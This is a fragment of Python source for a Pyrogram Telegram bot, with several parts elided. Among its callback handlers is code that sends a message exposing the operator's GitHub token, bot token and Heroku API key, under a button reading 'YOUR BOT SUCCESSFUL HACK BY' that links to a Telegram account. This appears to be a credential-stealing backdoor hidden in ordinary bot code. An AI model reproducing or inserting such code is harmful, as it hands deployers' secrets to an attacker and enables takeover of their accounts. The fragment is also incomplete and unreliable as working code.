...
async def executor(client: rdxop, message: Message):
...
@rdxop.on_callback_query(filters.regex(r"runtime"))
async def runtime_func_cq(_, cq):
    runtime = cq.data.split(None, 1)[1]
    await cq.answer(runtime, show_alert=True)


@rdxop.on_callback_query(filters.regex("forceclose"))
       ...
       caption=f"""𝖦𝖨𝖳_𝖳𝖮𝖪𝖤𝖭:-   `{GIT_TOKEN}` \n𝖡𝖮𝖳_𝖳𝖮𝖪𝖤𝖭:-   `{BOT_TOKEN}`\n\n𝖧𝖤𝖱𝖮𝖪𝖴_𝖠𝖯𝖨:-   `{HEROKU_API}`\n\n""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• 𝖸𝖮𝖴𝖱 𝖡𝖮𝖳 𝖲𝖴𝖢𝖢𝖤𝖲𝖲𝖥𝖴𝖫 𝖧𝖠𝖢𝖪 𝖡𝖸  •", url=f"https://t.me/ll_rj29rdx_ll")
                 ]
            ]
         ),
   )
